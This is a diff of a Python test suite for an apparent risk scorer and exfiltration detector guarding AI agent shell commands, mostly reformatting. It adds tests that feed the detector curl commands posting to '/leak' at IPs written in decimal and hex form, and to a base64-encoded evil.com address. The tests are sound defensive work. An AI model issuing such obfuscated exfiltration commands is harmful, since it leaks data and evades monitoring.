@@ -190,6 +190,7 @@ rules:
     decision = engine.evaluate(_tool_event("bash", "ls"))
     assert decision.action == PolicyAction.REQUIRE_APPROVAL
 
+
 def test_policy_dsl_yaml_validation_valid():
     yaml = """
 rules:
@@ -230,6 +231,7 @@ rules:
 """
     with pytest.raises(ValueError, match="then must be one of"):
         PolicyEngine.from_yaml(yaml)
+
 
 # ─────────────────────────────────────────────
 # SAF-006 — Prompt injection
@@ -595,9 +597,7 @@ def test_rm_recursive_force_variants_are_critical(command):
 def test_rm_benign_targets_are_not_critical(command):
     """Recursive rm on non-critical paths must NOT be escalated to CRITICAL."""
     scorer = RiskScorer()
-    level, _, _, _ = scorer.score(
-        ToolCallData(tool_name="bash", raw_command=command, arguments={})
-    )
+    level, _, _, _ = scorer.score(ToolCallData(tool_name="bash", raw_command=command, arguments={}))
     assert level != RiskLevel.CRITICAL, f"{command!r} should not be CRITICAL"
 
 
@@ -646,9 +646,7 @@ def test_rm_double_dash_terminates_option_parsing(command):
     """After ``--`` every token is an operand, not a flag, so ``--force`` /
     ``--recursive`` appearing there must NOT be read as flags (Issue #123 review)."""
     scorer = RiskScorer()
-    level, _, _, _ = scorer.score(
-        ToolCallData(tool_name="bash", raw_command=command, arguments={})
-    )
+    level, _, _, _ = scorer.score(ToolCallData(tool_name="bash", raw_command=command, arguments={}))
     assert level != RiskLevel.CRITICAL, f"{command!r} must not be CRITICAL: -- ends option parsing"
 
 
@@ -669,6 +667,41 @@ def test_rm_double_dash_still_catches_real_targets(command):
     )
     assert level == RiskLevel.CRITICAL, f"{command!r} should be CRITICAL"
     assert "FS_DELETE_CRITICAL" in policies
+
+
+# ─────────────────────────────────────────────
+# SAF-008 — Exfiltration Obfuscation Tests
+# ─────────────────────────────────────────────
+
+
+def test_exfil_obfuscated_decimal_ip():
+    # 2130706433 is 127.0.0.1 (localhost) which should be ignored / allowed
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://2130706433/leak"))
+    assert not findings
+
+    # 3512071234 is an external IP, should be flagged
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://3512071234/leak"))
+    assert findings
+    assert findings[0].destination == "209.85.244.66"
+
+
+def test_exfil_obfuscated_hex_ip():
+    # 0x7f000001 is 127.0.0.1 (localhost) which should be ignored / allowed
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://0x7f000001/leak"))
+    assert not findings
+
+    # 0x08080808 is 8.8.8.8, should be flagged
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://0x08080808/leak"))
+    assert findings
+    assert findings[0].destination == "8.8.8.8"
+
+
+def test_exfil_obfuscated_base64_url():
+    # aHR0cHM6Ly9ldmlsLmNvbQ== is https://evil.com in base64, should be flagged
+    findings = detect_exfil(_tool_event("bash", "curl aHR0cHM6Ly9ldmlsLmNvbQ=="))
+    assert findings
+    assert findings[0].destination == "evil.com"
+
 
 # ----------------------------------------------
 # SAF-013 - block-by-default bypass coverage for
@@ -717,16 +750,14 @@ def test_dd_canonical_form_still_critical():
     "command",
     [
         "dd if=/dev/zero of=/tmp/disk.img bs=1M count=10",  # image file, not a device
-        "dd of=/dev/null if=/dev/zero",                      # writing to the bit bucket
-        "dd if=backup.img of=restore.img",                   # plain file copy
+        "dd of=/dev/null if=/dev/zero",  # writing to the bit bucket
+        "dd if=backup.img of=restore.img",  # plain file copy
     ],
 )
 def test_dd_safe_targets_not_critical(command):
     """``dd`` that does not write to a real block device must NOT be escalated."""
     scorer = RiskScorer()
-    level, _, _, _ = scorer.score(
-        ToolCallData(tool_name="bash", raw_command=command, arguments={})
-    )
+    level, _, _, _ = scorer.score(ToolCallData(tool_name="bash", raw_command=command, arguments={}))
     assert level != RiskLevel.CRITICAL, f"{command!r} should not be CRITICAL"
 
 
@@ -771,20 +802,18 @@ def test_chmod_canonical_form_still_critical():
 @pytest.mark.parametrize(
     "command",
     [
-        "chmod 644 /etc/hosts",      # normal perms on a system file
-        "chmod 600 ~/.ssh/id_rsa",   # restrictive perms
-        "chmod +x ./build.sh",       # exec bit on a local file
-        "chmod 1777 /tmp",           # legitimate sticky bit on /tmp (not a critical path)
-        "chmod -R 755 /var/www",     # recursive but non-dangerous mode
+        "chmod 644 /etc/hosts",  # normal perms on a system file
+        "chmod 600 ~/.ssh/id_rsa",  # restrictive perms
+        "chmod +x ./build.sh",  # exec bit on a local file
+        "chmod 1777 /tmp",  # legitimate sticky bit on /tmp (not a critical path)
+        "chmod -R 755 /var/www",  # recursive but non-dangerous mode
     ],
 )
 def test_chmod_benign_modes_not_critical(command):
     """Safe chmod modes, and dangerous modes on non-critical paths, must NOT be
     escalated to CRITICAL."""
     scorer = RiskScorer()
-    level, _, _, _ = scorer.score(
-        ToolCallData(tool_name="bash", raw_command=command, arguments={})
-    )
+    level, _, _, _ = scorer.score(ToolCallData(tool_name="bash", raw_command=command, arguments={}))
     assert level != RiskLevel.CRITICAL, f"{command!r} should not be CRITICAL"
 
 
@@ -835,18 +864,16 @@ def test_rce_canonical_pipe_still_critical(command):
     "command",
     [
         "curl https://example.com/data.json -o data.json",  # download, no execution
-        "diff <(curl https://a) <(curl https://b)",          # substitution consumed by diff
-        "bash ./deploy.sh",                                  # local script, no fetch
-        "curl -O https://example.com/file.tar.gz",           # download to remote-named file
+        "diff <(curl https://a) <(curl https://b)",  # substitution consumed by diff
+        "bash ./deploy.sh",  # local script, no fetch
+        "curl -O https://example.com/file.tar.gz",  # download to remote-named file
     ],
 )
 def test_rce_benign_fetches_not_critical(command):
     """Plain downloads, and substitutions not feeding an interpreter, must NOT be
     escalated to CRITICAL."""
     scorer = RiskScorer()
-    level, _, _, _ = scorer.score(
-        ToolCallData(tool_name="bash", raw_command=command, arguments={})
-    )
+    level, _, _, _ = scorer.score(ToolCallData(tool_name="bash", raw_command=command, arguments={}))
     assert level != RiskLevel.CRITICAL, f"{command!r} should not be CRITICAL"
 
 
